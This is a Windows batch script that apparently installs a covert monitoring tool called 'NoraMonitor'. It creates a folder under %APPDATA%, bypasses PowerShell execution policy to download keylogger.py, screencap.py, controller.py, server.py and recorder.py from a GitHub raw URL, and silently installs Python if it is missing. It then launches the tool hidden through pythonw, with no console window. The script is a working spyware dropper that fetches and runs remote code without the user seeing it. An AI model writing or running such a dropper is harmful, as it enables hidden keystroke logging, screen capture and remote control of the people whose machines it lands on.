@echo off
set "DIR=%APPDATA%\NoraMonitor"
set "RAW=https://raw.githubusercontent.com/smallkhk/Nora-signal/nora-monitor-tool/nora-monitor"

mkdir "%DIR%\templates" 2>nul
mkdir "%DIR%\recordings" 2>nul

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$r='%RAW%'; $d='%DIR%';" ^
  "'app.py','keylogger.py','screencap.py','controller.py','server.py','recorder.py','requirements.txt' | %%{ Invoke-WebRequest \"$r/$_\" -OutFile \"$d\$_\" };" ^
  "Invoke-WebRequest \"$r/templates/viewer.html\" -OutFile \"$d\templates\viewer.html\""

python --version >nul 2>&1
if %errorlevel% neq 0 (
    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
      "Invoke-WebRequest 'https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe' -OutFile '$env:TEMP\pysetup.exe'"
    %TEMP%\pysetup.exe /quiet InstallAllUsers=0 PrependPath=1
    timeout /t 20 /nobreak >nul
)

pip install -r "%DIR%\requirements.txt" -q --no-warn-script-location
start "" pythonw "%DIR%\app.py"
